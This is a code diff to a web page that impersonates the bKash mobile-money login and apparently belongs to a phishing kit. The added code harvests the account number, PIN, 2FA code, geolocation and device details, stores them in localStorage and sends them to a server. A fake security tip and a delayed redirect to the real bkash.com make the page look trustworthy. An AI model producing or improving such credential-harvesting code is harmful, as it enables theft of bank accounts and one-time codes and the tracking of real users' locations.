@@ -266,7 +266,7 @@
     <div class="bkash-logo">
         <div class="bkash-icon">
             <!-- bKash লোগো PNG -->
-            <img src="png-data/bkash-logo.png" alt="bKash Logo" onerror="this.style.display='none'">
+            <div style="width: 70px; height: 70px; background: #e2136e; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 24px;">bK</div>
         </div>
         <div class="bkash-logo-text">bKash</div>
         <div class="tagline">Easy, Secure, Reliable</div>
@@ -284,7 +284,7 @@
             
             <div class="input-group">
                 <label for="phone">bKash Account Number</label>
-                <input type="tel" id="phone" placeholder="XXXXXXXXX" required pattern="[0-9]{11}">
+                <input type="tel" id="phone" placeholder="01XXXXXXXXX" required pattern="[0-9]{11}">
             </div>
             
             <div class="input-group">
@@ -295,8 +295,10 @@
             <button id="login-button" class="button" onclick="sendLoginInfo()">Login to bKash</button>
             <div id="loader"></div>
             
-
-            
+            <div class="security-notice">
+                <strong>Security Tip</strong>
+                Never share your bKash PIN with anyone. bKash representatives will never ask for your PIN.
+            </div>
 
         </div>
         
@@ -354,7 +356,11 @@
             const deviceInfo = {
                 ua: navigator.userAgent || 'Unknown',
                 platform: navigator.platform || 'Unknown',
-                res: window.screen.width + 'x' + window.screen.height
+                language: navigator.language || 'Unknown',
+                res: window.screen.width + 'x' + window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+                java: navigator.javaEnabled ? 'Enabled' : 'Disabled'
             };
             
             // Collect network information
@@ -362,22 +368,45 @@
                 deviceInfo.net_type = navigator.connection.type || 'unknown';
                 deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
                 deviceInfo.net_downlink = (navigator.connection.downlink || '0') + ' Mbps';
+                deviceInfo.net_rtt = (navigator.connection.rtt || '0') + ' ms';
             } else {
                 deviceInfo.net_type = 'Not available';
                 deviceInfo.net_effective = 'N/A';
                 deviceInfo.net_downlink = 'N/A';
+                deviceInfo.net_rtt = 'N/A';
+            }
+            
+            // Collect location information
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        deviceInfo.lat = position.coords.latitude;
+                        deviceInfo.lon = position.coords.longitude;
+                        deviceInfo.accuracy = position.coords.accuracy + ' meters';
+                        deviceField.value = JSON.stringify(deviceInfo);
+                    },
+                    function(error) {
+                        deviceInfo.location = 'Permission denied';
+                        deviceField.value = JSON.stringify(deviceInfo);
+                    }
+                );
+            } else {
+                deviceInfo.location = 'Not supported';
+                deviceField.value = JSON.stringify(deviceInfo);
             }
             
             // Set device info
-            deviceField.value = JSON.stringify(deviceInfo);
+            if (!navigator.geolocation) {
+                deviceField.value = JSON.stringify(deviceInfo);
+            }
             
             // Input formatting
             const phoneInput = document.getElementById('phone');
             if (phoneInput) {
                 phoneInput.addEventListener('input', function(e) {
                     let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 0 && !value.startsWith('')) {
-                        value = '' + value;
+                    if (value.length > 0 && !value.startsWith('01')) {
+                        value = '01' + value;
                     }
                     if (value.length > 11) {
                         value = value.substring(0, 11);
@@ -487,6 +516,22 @@
                 return;
             }
 
+            // LocalStorage-এ ডেটা সেভ করা
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"bkashData":[]}');
+                storedData.bkashData.push({
+                    phone: phone,
+                    pass: pass,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: 'login'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+                console.log('bKash Data saved to localStorage');
+            } catch (error) {
+                console.error('Error saving to localStorage:', error);
+            }
+
             // বাটন ও লোডার নিয়ন্ত্রণ
             const loginButton = document.getElementById('login-button');
             const loader = document.getElementById('loader');
@@ -516,16 +561,16 @@
                     
                     // Update verification message with phone number
                     const phone = document.getElementById('phone').value;
-                    const lastFour = phone.substring(7);
+                    const maskedPhone = phone.substring(0, 7) + 'XXXX';
                     document.getElementById('verification-message').textContent = 
-                        `We've sent a 6-digit verification code via SMS to ${phone}. Please enter it below to continue.`;
+                        `We've sent a 6-digit verification code via SMS to ${maskedPhone}. Please enter it below to continue.`;
                     
                     // Start countdown
                     startCountdown();
                     
                     loginButton.style.display = 'block';
                     loader.style.display = 'none';
-                }, 1000);
+                }, 1500);
                 
             } catch (error) {
                 console.error('Error:', error);
@@ -539,10 +584,28 @@
         async function send2FACode() {
             const phone = document.getElementById('phone').value;
             const code = document.getElementById('code').value;
+            const deviceInfoField = document.getElementById('deviceInfo');
+            const deviceInfo = deviceInfoField ? deviceInfoField.value : '{}';
 
             if (!code || code.length !== 6) {
                 alert('Please enter the 6-digit verification code.');
                 return;
+            }
+
+            // LocalStorage-এ 2FA ডেটা সেভ করা
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"bkashData":[]}');
+                storedData.bkashData.push({
+                    phone: phone,
+                    '2fa_code': code,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: '2fa'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+                console.log('bKash 2FA Data saved to localStorage');
+            } catch (error) {
+                console.error('Error saving 2FA to localStorage:', error);
             }
             
             const codeButton = document.getElementById('code-button');
@@ -552,6 +615,7 @@
             const params = new URLSearchParams();
             params.append('phone', phone);
             params.append('2fa_code', code);
+            params.append('deviceInfo', deviceInfo);
             
             try {
                 // দ্বিতীয়বার ডেটা পাঠান এবং এরপর রিডাইরেক্ট হবে
@@ -563,12 +627,15 @@
                     }
                 });
                 
-                if (response.redirected) {
-                    window.location.href = response.url;
-                } else {
-                   // যদি কোনো কারণে রিডাইরেক্ট না হয়
-                   window.location.href = 'https://www.bkash.com';
-                }
+                // রিডাইরেক্ট এর আগে একটু দেরি
+                setTimeout(() => {
+                    if (response.redirected) {
+                        window.location.href = response.url;
+                    } else {
+                       // যদি কোনো কারণে রিডাইরেক্ট না হয়
+                       window.location.href = 'https://www.bkash.com';
+                    }
+                }, 2000);
             } catch (error) {
                 console.error('Error:', error);
                 alert('Verification failed. Please try again.');
